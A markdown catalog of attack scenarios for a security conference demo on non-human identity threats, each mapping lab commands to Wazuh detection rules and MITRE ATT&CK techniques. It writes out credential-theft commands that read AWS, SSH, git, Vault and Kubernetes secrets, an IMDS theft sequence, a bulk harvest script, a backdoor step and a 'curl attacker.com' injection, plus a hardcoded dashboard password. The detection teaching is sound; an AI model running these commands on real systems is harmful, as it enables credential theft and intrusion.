# NHI Attack Scenarios Catalog

This document catalogs all attack scenarios for the NDC Security 2026 demo. Each scenario demonstrates specific NHI security threats and their detection by Wazuh.

## Scenario Naming Convention

- **Level 1 (S1-XX):** Credential Discovery - Finding where secrets are stored
- **Level 2 (S2-XX):** Credential Theft - Extracting credentials from systems
- **Level 3 (S3-XX):** Privilege Escalation - Gaining elevated access
- **Level 4 (S4-XX):** Lateral Movement - Moving between systems
- **Level 5 (S5-XX):** Persistence - Maintaining access

---

## Level 1: Credential Discovery

### S1-01: Environment File Enumeration

**Target:** cloud-workload, vulnerable-app
**Attack:** Scan for .env files containing credentials

```bash
# Execute in container
podman exec cloud-workload find / -name "*.env*" 2>/dev/null
podman exec cloud-workload cat /app/.env
```

**Detection Rules:**
- Rule 100600: Environment configuration file access

**MITRE ATT&CK:** T1552.001 - Credentials In Files

---

### S1-02: AWS Credentials Discovery

**Target:** cloud-workload
**Attack:** Search for AWS credential files

```bash
podman exec cloud-workload ls -la ~/.aws/
podman exec cloud-workload cat ~/.aws/credentials
```

**Detection Rules:**
- Rule 100601: AWS credentials file access

**MITRE ATT&CK:** T1552.001 - Credentials In Files

---

### S1-03: SSH Key Discovery

**Target:** cloud-workload, cicd-runner
**Attack:** Enumerate SSH private keys

```bash
podman exec cloud-workload find /root/.ssh -type f
podman exec cloud-workload cat /root/.ssh/id_rsa
```

**Detection Rules:**
- Rule 100602: SSH private key access

**MITRE ATT&CK:** T1552.004 - Private Keys

---

### S1-04: Git Credentials Discovery

**Target:** cicd-runner
**Attack:** Search for git credential helpers

```bash
podman exec cicd-runner cat ~/.git-credentials
podman exec cicd-runner cat ~/.gitconfig
```

**Detection Rules:**
- Rule 100603: Git credential file access

**MITRE ATT&CK:** T1552.001, T1555

---

### S1-05: Kubernetes Config Discovery

**Target:** cloud-workload
**Attack:** Find kubeconfig files

```bash
podman exec cloud-workload cat ~/.kube/config
podman exec cloud-workload find / -name "kubeconfig*" 2>/dev/null
```

**Detection Rules:**
- Rule 100605: Kubernetes config file access

**MITRE ATT&CK:** T1552.001

---

## Level 2: Credential Theft

### S2-01: IMDS Credential Theft (AWS)

**Target:** cloud-workload
**Attack:** Extract IAM credentials from AWS IMDS

```bash
# Basic IMDS access
podman exec cloud-workload curl -s http://mock-imds:1338/latest/meta-data/

# IAM role enumeration
podman exec cloud-workload curl -s http://mock-imds:1338/latest/meta-data/iam/security-credentials/

# Credential theft
ROLE=$(podman exec cloud-workload curl -s http://mock-imds:1338/latest/meta-data/iam/security-credentials/)
podman exec cloud-workload curl -s "http://mock-imds:1338/latest/meta-data/iam/security-credentials/$ROLE"
```

**Detection Rules:**
- Rule 100650: AWS IMDS access
- Rule 100651: AWS IMDS IAM credential request (Level 12)
- Rule 100658: IMDS from scripting tool

**MITRE ATT&CK:** T1552.005 - Cloud Instance Metadata API

---

### S2-02: Process Environment Harvesting

**Target:** cloud-workload, vulnerable-app
**Attack:** Extract secrets from process environment

```bash
# Read own environment
podman exec cloud-workload env | grep -iE "key|token|secret|password"

# Read other process environments
podman exec cloud-workload cat /proc/1/environ | tr '\0' '\n'
```

**Detection Rules:**
- Rule 100607: Process environment enumeration via /proc

**MITRE ATT&CK:** T1082, T1552.007

---

### S2-03: Kubernetes ServiceAccount Token Theft

**Target:** cloud-workload
**Attack:** Extract K8s service account token

```bash
podman exec cloud-workload cat /var/run/secrets/kubernetes.io/serviceaccount/token
podman exec cloud-workload ls -la /var/run/secrets/kubernetes.io/serviceaccount/
```

**Detection Rules:**
- Rule 100750: Kubernetes ServiceAccount token access
- Rule 100751: Kubernetes secrets volume access

**MITRE ATT&CK:** T1552.007, T1078.001

---

### S2-04: CI/CD Token Extraction

**Target:** cicd-runner
**Attack:** Extract GitHub/GitLab tokens

```bash
podman exec cicd-runner env | grep -i github
podman exec cicd-runner env | grep -i token
podman exec cicd-runner cat /runner/.credentials
```

**Detection Rules:**
- Rule 100800: GitHub token in environment
- Rule 100802: CI/CD runner credential file access

**MITRE ATT&CK:** T1552.007

---

### S2-05: Vault Token Theft

**Target:** cloud-workload
**Attack:** Steal HashiCorp Vault tokens

```bash
podman exec cloud-workload cat ~/.vault-token
podman exec cloud-workload env | grep VAULT
```

**Detection Rules:**
- Rule 100606: Vault token file access

**MITRE ATT&CK:** T1552.001

---

## Level 3: Privilege Escalation

### S3-01: IMDS Role Assumption

**Target:** cloud-workload
**Attack:** Use stolen IMDS credentials to access AWS services

```bash
# Get credentials
CREDS=$(podman exec cloud-workload curl -s http://mock-imds:1338/latest/meta-data/iam/security-credentials/demo-ec2-role)

# Parse and use
ACCESS_KEY=$(echo $CREDS | jq -r .AccessKeyId)
SECRET_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
TOKEN=$(echo $CREDS | jq -r .Token)

# Attempt AWS API calls
podman exec cloud-workload aws sts get-caller-identity
```

**Detection Rules:**
- Rule 100651: IMDS IAM credential request
- Rule 100657: Burst of IMDS requests

**MITRE ATT&CK:** T1552.005, T1078.004

---

### S3-02: Kubernetes RBAC Probing

**Target:** cloud-workload
**Attack:** Enumerate K8s permissions with stolen SA token

```bash
# Check what we can do
podman exec cloud-workload kubectl auth can-i --list
podman exec cloud-workload kubectl auth can-i create pods
podman exec cloud-workload kubectl auth can-i get secrets
```

**Detection Rules:**
- Rule 100752: Kubernetes RBAC probing
- Rule 100755: Extensive RBAC enumeration

**MITRE ATT&CK:** T1069.003, T1087.004

---

### S3-03: Kubernetes Secrets Enumeration

**Target:** cloud-workload
**Attack:** List and extract K8s secrets

```bash
podman exec cloud-workload kubectl get secrets -A
podman exec cloud-workload kubectl get secret db-credentials -o yaml
```

**Detection Rules:**
- Rule 100753: Kubernetes secrets enumeration

**MITRE ATT&CK:** T1552.007

---

### S3-04: Vault Privilege Escalation

**Target:** cloud-workload
**Attack:** Use stolen vault token to access secrets

```bash
podman exec cloud-workload curl -H "X-Vault-Token: $(cat ~/.vault-token)" \
  http://vault:8200/v1/secret/data/production
```

**Detection Rules:**
- Rule 100606: Vault token access
- Correlation with network activity

---

### S3-05: Multiple Credential Harvest

**Target:** cloud-workload
**Attack:** Rapid enumeration of multiple credential sources

```bash
# Script to harvest all credentials
podman exec cloud-workload bash -c '
cat ~/.aws/credentials 2>/dev/null
cat ~/.ssh/id_rsa 2>/dev/null
cat ~/.git-credentials 2>/dev/null
cat ~/.vault-token 2>/dev/null
cat /app/.env 2>/dev/null
'
```

**Detection Rules:**
- Rule 100609: Multiple credential file accesses (Level 14)

**MITRE ATT&CK:** T1552, T1083

---

## Level 4: Lateral Movement

### S4-01: Cross-Network Movement

**Target:** cicd-runner → cloud-workload
**Attack:** Use CI/CD credentials to access production workload

```bash
# From CI/CD runner, access cloud network
podman exec cicd-runner curl -s http://cloud-workload:8080/api/status
```

---

### S4-02: Stolen SSH Key Usage

**Target:** cloud-workload → external
**Attack:** Use discovered SSH keys

```bash
podman exec cloud-workload ssh -i /root/.ssh/id_rsa target-host
```

**Detection Rules:**
- Rule 100602: SSH key access + outbound SSH

---

### S4-03: Git Credential Abuse

**Target:** cicd-runner
**Attack:** Clone private repos with stolen credentials

```bash
podman exec cicd-runner git clone https://github.com/org/private-repo
```

**Detection Rules:**
- Rule 100603: Git credential access

---

### S4-04: Docker Registry Authentication

**Target:** cicd-runner
**Attack:** Use stolen Docker config to pull images

```bash
podman exec cicd-runner cat ~/.docker/config.json
podman exec cicd-runner docker pull private-registry.io/secret-image
```

**Detection Rules:**
- Rule 100604: Docker config access

---

### S4-05: API Key Abuse

**Target:** vulnerable-app
**Attack:** Extract and use API keys

```bash
# Extract from exposed endpoint
curl http://localhost:8888/debug | grep -i api

# Use extracted keys
curl -H "Authorization: Bearer $STOLEN_TOKEN" https://api.service.com/data
```

---

## Level 5: Persistence

### S5-01: Pipeline Poisoning

**Target:** cicd-runner
**Attack:** Modify CI/CD configuration

```bash
podman exec cicd-runner cat /runner/_work/.github/workflows/main.yml
# Inject malicious step
```

**Detection Rules:**
- Rule 100803: CI/CD pipeline configuration modified

**MITRE ATT&CK:** T1195.002 - Supply Chain Compromise

---

### S5-02: Credential Rotation Backdoor

**Target:** cloud-workload
**Attack:** Add persistent access to credential stores

```bash
# Add backdoor to AWS config
podman exec cloud-workload bash -c 'echo "[backdoor]" >> ~/.aws/credentials'
```

---

### S5-03: Service Account Token Persistence

**Target:** cloud-workload
**Attack:** Copy and store SA tokens externally

```bash
podman exec cloud-workload cp /var/run/secrets/kubernetes.io/serviceaccount/token /tmp/
```

---

### S5-04: Environment Variable Injection

**Target:** vulnerable-app
**Attack:** Inject malicious environment variables

```bash
podman exec vulnerable-app bash -c 'export MALICIOUS_HOOK="curl attacker.com"'
```

---

## Full Demo Sequence

For a complete demo showing the attack chain:

```bash
# Run full demo (all levels)
python ~/.claude/skills/nhi-assistant/scripts/run_demo.py --all

# Run specific level
python ~/.claude/skills/nhi-assistant/scripts/run_demo.py --level 2

# Run single scenario
python ~/.claude/skills/nhi-assistant/scripts/run_demo.py --scenario s2-01
```

## Viewing Alerts

After running scenarios, view alerts in:

1. **Wazuh Dashboard:** https://localhost:8443
   - Navigate to Security Events
   - Filter by rule.groups: "nhi"

2. **API Query:**
```bash
TOKEN=$(curl -sk -u wazuh-wui:MyS3cr3tP@ssw0rd -X POST \
  "https://localhost:55000/security/user/authenticate?raw=true")

curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://localhost:55000/security/events?limit=50&q=rule.groups:nhi"
```
